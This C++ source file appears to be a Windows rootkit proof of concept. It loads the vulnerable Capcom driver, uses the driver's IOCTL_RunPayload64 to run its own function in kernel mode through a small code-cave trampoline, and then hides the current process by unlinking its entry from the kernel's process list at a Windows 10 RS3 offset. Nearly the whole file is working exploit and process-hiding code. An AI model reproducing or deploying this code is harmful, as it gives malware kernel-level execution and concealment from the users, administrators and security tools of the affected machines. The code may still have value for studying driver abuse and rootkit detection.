#include <windows.h>
#include <iostream>
// #include <intrin.h>
#include "CapcomLoader.h"
#include "CapcomAttack.h"

using namespace std;

FARPROC GetRoutine(MmGetSystemRoutineAddress_t pMmGetSystemRoutineAddress, const wchar_t *routineName) {
	UNICODE_STRING routineNameU = { 0 };
	RtlInitUnicodeString(&routineNameU, routineName);
	return (FARPROC)pMmGetSystemRoutineAddress(&routineNameU);
}

void HideProcess(void* pProcess) {
	static const DWORD WIN10_RS3_OFFSET = 0x2e8;
    // static const DWORD WIN10_RS4_OFFSET = 0x300;

	PLIST_ENTRY plist =  (PLIST_ENTRY)((LPBYTE)pProcess + WIN10_RS3_OFFSET);

	*((DWORD64*)plist->Blink) = (DWORD64)plist->Flink;
	*((DWORD64*)plist->Flink + 1) = (DWORD64)plist->Blink;

	plist->Flink = (PLIST_ENTRY) &(plist->Flink);
	plist->Blink = (PLIST_ENTRY) &(plist->Flink);
}

void KernelFunc(MmGetSystemRoutineAddress_t pMmGetSystemRoutineAddress) {
	//__debugbreak();

	FARPROC pPsGetCurrentProcess =  GetRoutine(pMmGetSystemRoutineAddress, L"PsGetCurrentProcess");
	void* pProcess = (void*)pPsGetCurrentProcess();
	HideProcess(pProcess);
}

BOOL InitDriver() {
    if (!LoadDriver()) {
        cout << "StartAttack::Loading driver failed!" << endl;
        return FALSE;
    }

    device = OpenDevice("Htsysm72FB");
    if (!device) {
        cout << "StartAttack::Could not retrieve device!" << endl;
    }

    return TRUE;
}

BOOL StartAttack() {

    BYTE codeCave[] = {
		0x48, 0xB8, 0, 0, 0, 0, 0, 0, 0, 0,		// mov rax
		0xFF, 0xE0								// jmp rax
	};
    *(DWORD64*)((PUCHAR)codeCave + 2) = (DWORD64)(ULONG_PTR)KernelFunc;

    DWORD status = 0x0;
    DWORD bytesReturned = 0x0;
    DeviceIoControl(
        device,
        IOCTL_RunPayload64,
        // &KernelFunc,
        &codeCave,
        sizeof(codeCave),
        &status,
        sizeof(status),
        &bytesReturned,
        0
    );
    return TRUE;
}